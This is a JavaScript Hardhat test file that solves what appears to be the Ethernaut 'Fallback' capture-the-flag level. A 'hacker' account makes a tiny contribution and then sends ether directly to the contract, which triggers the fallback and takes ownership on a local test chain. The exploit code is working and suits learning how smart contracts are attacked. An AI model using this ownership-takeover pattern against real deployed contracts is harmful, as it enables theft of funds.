const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);


before(async () => {
  const accounts =  await hre.ethers.getSigners();
  deployer = accounts[0];
  hacker = accounts[1];
  const factory = await ethers.getContractFactory("Fallback");
  contract = await factory.deploy();
  await contract.deployed()
});

describe("Fallback", () => {
    it('sets deployer as owner', async () =>{
        expect(await contract.owner()).to.eq(deployer.address)
    })

    it('does not set hacker as owner', async () =>{
        expect(await contract.owner()).to.not.eq(hacker.address)
    })

    it('initiates hack', async () =>{
        console.log('contributing to Fallback to get access to fallback()')
        await contract.connect(hacker).contribute({value: 1, gasLimit: 3e6})
        console.log("initiating hack!")
        const balanceOfContractBefore = await ethers.provider.getBalance(contract.address)
        await hacker.sendTransaction({
            to: contract.address,
            value: 1,
            gasLimit: 3e6,
        })
        expect(await ethers.provider.getBalance(contract.address)).to.eq(balanceOfContractBefore.add(1))
        expect(await contract.owner()).to.eq(hacker.address)
        console.log("Hacked!!")
        util.updateTotalSolved(scriptName)
    })
})

